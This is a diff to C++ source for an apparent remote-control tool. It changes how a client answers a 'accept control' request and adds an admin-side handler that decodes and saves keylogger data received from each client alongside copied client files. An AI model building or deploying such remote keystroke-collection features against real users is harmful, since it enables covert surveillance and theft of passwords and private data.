@@ -212,19 +212,17 @@ void MyCurl::ClientProcess() { //Change the result
 	int queryInt = stoi(query);
 	result = "";
 	if (queryInt == 3) {
-		char ch;
 		while (true) {
-			cout << "Accept control from " << receiverID << "? (y/n): ";
-			cin >> ch;
-			if (ch == 'y') {
-				result = 'Y';
-				break;
-			}
-			else if (ch == 'n') {
-				result = 'N';
-				break;
+			if (filesystem::last_write_time(UIPath) != modifiedTime) {
+				this_thread::sleep_for(std::chrono::duration<double>(0.1));
+				modifiedTime = filesystem::last_write_time(UIPath);
+				fstream file(UIPath, ios::in);
+				getline(file, result, ';');
 			}
 		}
+	}
+	else {
+
 	}
 }
 void MyCurl::AdminProcess(const vector<string> IDs, const int query, vector<string> &failedClientIDs) {
@@ -258,6 +256,13 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query, vector<stri
 						file << subContent;
 						file.close();
 						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Copy/" + fileName + receiverID << endl;
+					}
+					else if (query == 24) {
+						subContent = base64_decode(subContent);
+						fstream file(ComPath + "Keylogger/keylogger" + receiverID, ios::out | ios::binary);
+						file << subContent;
+						file.close();
+						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Keylogger/keylogger" + receiverID << endl;
 					}
 					if (subContent == "N") {
 						failedClientIDs.push_back(receiverID);
